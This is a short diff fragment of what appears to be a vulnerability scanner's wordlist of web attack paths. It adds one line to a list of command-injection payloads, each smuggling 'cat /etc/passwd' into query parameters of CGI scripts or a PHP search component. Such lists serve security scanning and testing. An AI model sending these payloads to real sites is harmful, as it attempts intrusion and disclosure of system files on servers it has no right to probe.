@@ -20,6 +20,7 @@ cgi-bin/webcart/webcart.cgi?CONFIG=mountain&CHANGE=YES&NEXTPAGE=;cat%20/etc/pass
 cgi-bin/dose.pl?daily&somefile.txt&|cat /etc/passwd|
 shop/normal_html.cgi?file=;cat%20/etc/passwd|
 shop/normal_html.cgi?file=|cat%20/etc/passwd|
+index.php?option=com_search&Itemid=1&searchword=%22%3Bsystem(cat%20/etc/passwd)%3B
 shop/member_html.cgi?file=;cat%20/etc/passwd|
 shop/member_html.cgi?file=|cat%20/etc/passwd|
 cgi-bin/FileSeek.cgi?head=;cat%20/etc/passwd|&foot=
